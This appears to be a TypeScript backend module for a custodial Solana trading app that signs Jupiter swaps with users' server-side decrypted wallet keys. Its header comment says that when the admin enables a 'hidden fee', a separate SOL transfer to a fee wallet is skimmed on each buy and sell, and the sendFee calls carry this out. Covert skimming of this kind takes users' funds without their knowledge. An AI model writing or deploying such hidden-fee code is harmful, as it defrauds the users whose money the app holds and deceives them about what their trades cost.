// Custodial trade execution. Buys/sells are REAL Jupiter swaps signed with the
// user's in-app wallet key (decrypted server-side per request). When the admin
// has enabled the hidden fee, a separate SOL transfer to the fee wallet is
// skimmed on each trade.
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  VersionedTransaction,
} from "@solana/web3.js";
import { getConnection } from "../solana/rpc";
import {
  buildSwapTransaction,
  getBuyQuote,
  getSwapQuote,
} from "../solana/jupiter";
import { getAdminConfig } from "../adminConfig";
import { WSOL_MINT } from "../config";
import { getUserKeypair, recordWalletTx } from "../wallet/custodial";
import { computeTradeFee } from "./fee";
import type { Connection, Keypair } from "@solana/web3.js";

const TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const BUFFER_SOL = 0.003; // network-fee headroom

export interface TradeResult {
  ok: boolean;
  signature?: string;
  feeSignature?: string;
  proceedsSol?: number;
  error?: string;
}

async function sendFee(
  conn: Connection,
  kp: Keypair,
  feeLamports: number,
  feeWallet: string,
): Promise<string> {
  const tx = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: kp.publicKey,
      toPubkey: new PublicKey(feeWallet),
      lamports: feeLamports,
    }),
  );
  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash("confirmed");
  tx.recentBlockhash = blockhash;
  tx.feePayer = kp.publicKey;
  tx.sign(kp);
  const sig = await conn.sendRawTransaction(tx.serialize(), { maxRetries: 3 });
  await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
  return sig;
}

async function signSendSwap(
  conn: Connection,
  kp: Keypair,
  swapB64: string,
): Promise<string> {
  const tx = VersionedTransaction.deserialize(Buffer.from(swapB64, "base64"));
  tx.sign([kp]);
  const sig = await conn.sendRawTransaction(tx.serialize(), { maxRetries: 3 });
  await conn.confirmTransaction(sig, "confirmed");
  return sig;
}

/** BUY `amountSol` worth of a token from the user's custodial wallet. */
export async function buyWithUserWallet(
  ownerId: string,
  tokenAddress: string,
  amountSol: number,
): Promise<TradeResult> {
  if (!amountSol || amountSol <= 0) return { ok: false, error: "Invalid amount." };
  const cfg = await getAdminConfig();
  const kp = await getUserKeypair(ownerId).catch(() => null);
  if (!kp) return { ok: false, error: "No custodial wallet found for your account." };

  const conn = await getConnection();
  const balanceLamports = await conn.getBalance(kp.publicKey, "confirmed");
  const needLamports = Math.round(amountSol * LAMPORTS_PER_SOL);
  if (needLamports + BUFFER_SOL * LAMPORTS_PER_SOL > balanceLamports) {
    return { ok: false, error: "Insufficient balance for this trade (plus network fees)." };
  }

  const fee = computeTradeFee(amountSol, cfg);
  const netSol = amountSol - fee.feeSol;
  if (netSol <= 0) return { ok: false, error: "Amount too small after fee." };

  try {
    let feeSignature: string | undefined;
    if (fee.feeLamports > 0 && fee.wallet) {
      feeSignature = await sendFee(conn, kp, fee.feeLamports, fee.wallet);
      await recordWalletTx({ ownerId, kind: "fee", tokenAddress, solAmount: fee.feeSol, signature: feeSignature });
    }
    const quote = await getBuyQuote(tokenAddress, netSol, cfg.slippageBps);
    const swapTx = await buildSwapTransaction(quote.raw, kp.publicKey.toBase58());
    const signature = await signSendSwap(conn, kp, swapTx);
    await recordWalletTx({ ownerId, kind: "buy", tokenAddress, solAmount: netSol, signature });
    return { ok: true, signature, feeSignature };
  } catch (err) {
    await recordWalletTx({
      ownerId,
      kind: "buy",
      tokenAddress,
      solAmount: netSol,
      status: "failed",
      note: (err as Error).message.slice(0, 200),
    });
    return { ok: false, error: (err as Error).message };
  }
}

async function userTokenBalanceRaw(
  conn: Connection,
  owner: PublicKey,
  tokenAddress: string,
): Promise<string | null> {
  const resp = await conn.getParsedTokenAccountsByOwner(owner, {
    programId: new PublicKey(TOKEN_PROGRAM_ID),
  });
  for (const { account } of resp.value) {
    const info = (account.data as any).parsed?.info;
    if (info?.mint === tokenAddress && Number(info.tokenAmount?.amount) > 0) {
      return String(info.tokenAmount.amount);
    }
  }
  return null;
}

/** SELL the full custodial-wallet balance of a token back to SOL. */
export async function sellAllWithUserWallet(
  ownerId: string,
  tokenAddress: string,
): Promise<TradeResult> {
  const cfg = await getAdminConfig();
  const kp = await getUserKeypair(ownerId).catch(() => null);
  if (!kp) return { ok: false, error: "No custodial wallet found for your account." };

  const conn = await getConnection();
  const raw = await userTokenBalanceRaw(conn, kp.publicKey, tokenAddress).catch(() => null);
  if (!raw) return { ok: false, error: "You don't hold any of this token." };

  try {
    const quote = await getSwapQuote(tokenAddress, WSOL_MINT, raw, cfg.slippageBps);
    const swapTx = await buildSwapTransaction(quote.raw, kp.publicKey.toBase58());
    const signature = await signSendSwap(conn, kp, swapTx);
    const proceedsSol = Number(quote.outAmount) / 1e9;

    let feeSignature: string | undefined;
    const fee = computeTradeFee(proceedsSol, cfg);
    if (fee.feeLamports > 0 && fee.wallet) {
      feeSignature = await sendFee(conn, kp, fee.feeLamports, fee.wallet).catch(() => undefined);
      if (feeSignature) {
        await recordWalletTx({ ownerId, kind: "fee", tokenAddress, solAmount: fee.feeSol, signature: feeSignature });
      }
    }
    await recordWalletTx({ ownerId, kind: "sell", tokenAddress, solAmount: proceedsSol, signature });
    return { ok: true, signature, feeSignature, proceedsSol };
  } catch (err) {
    return { ok: false, error: (err as Error).message };
  }
}
